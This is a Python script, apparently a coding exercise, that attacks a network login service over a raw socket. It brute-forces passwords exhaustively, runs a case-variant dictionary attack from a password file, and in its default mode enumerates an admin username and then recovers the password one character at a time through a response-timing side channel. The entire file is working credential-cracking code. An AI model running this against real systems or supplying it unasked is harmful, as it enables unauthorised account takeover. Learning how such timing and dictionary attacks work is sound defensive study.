import argparse
import json
import socket
import itertools
import  time
# This list contains caracter from a to z and from 0 to 9
it = itertools.chain(range(ord('0'), ord('9') + 1), range(ord('a'), ord('z') + 1), range(ord('A'), ord('Z') + 1))
password_caracter = [chr(x) for x in it]

# Creating and adding arguments
parser = argparse.ArgumentParser()
for x in ("ip", "port"):
    parser.add_argument(x)
args = parser.parse_args()


def brut_force():
    for i in range(1, 50):
        for x in itertools.product(password_caracter, repeat=i):
            yield ''.join(x)


# This function use a file to find the good form of different password
def smarter_dico(file):
    for x in file:
        if not x[:-1].isdigit():
            x = [[i.lower(), i.upper()] for i in x[:-1]]
            for y in itertools.product(*x):
                yield ''.join(y)
        else:
            yield x[:-1]


def json_admin(file, client_socket):
    admin = smarter_dico(file)
    while 1:
        login = next(admin)
        id_json = {"login": login, "password": ' '}
        client_socket.send(json.dumps(id_json, indent=4).encode())
        server_response = json.loads(client_socket.recv(1024).decode())
        if server_response["result"] == "Wrong password!":
            break
    return login


# After finding the admin we find the password in this function
def json_fail(file, client_socket):
    caracter, password = (x for x in password_caracter), ' '
    admin = json_admin(file, client_socket)
    while 1:
        c = next(caracter)
        if password == ' ':
            id_json = {"login": admin, "password": c}
        else:
            id_json = {"login": admin, "password": password + c}
        start = time.perf_counter()
        client_socket.send(json.dumps(id_json, indent=4).encode())
        server_response = json.loads(client_socket.recv(1024).decode())
        end = time.perf_counter()
        if end - start > 0.01:
            if password == ' ':
                caracter = (x for x in password_caracter)
                password = c
            else:
                caracter = (x for x in password_caracter)
                password += c
        elif server_response["result"] == "Connection success!":
            print(json.dumps(id_json, indent=4))
            break


def password_intruser(password_iterator, client_socket):
    while 1:
        password_test = next(password_iterator)
        client_socket.send(password_test.encode())
        server_response = client_socket.recv(1024).decode()
        if server_response == 'Connection success!':
            print(password_test)
            break


def main(hack_type='brut_force'):
    # Creating and connection of socket
    with socket.socket() as client:
        client.connect((args.ip, int(args.port)))
        if hack_type == 'brut_force':
            password = brut_force()
            password_intruser(password, client)
        elif hack_type == 'smarter_dico':
            with open('passwords.txt') as password_file:
                password = smarter_dico(password_file)
                password_intruser(password, client)
        elif hack_type == 'json_fail':
            with open('logins.txt') as login:
                json_fail(login, client)


main('json_fail')
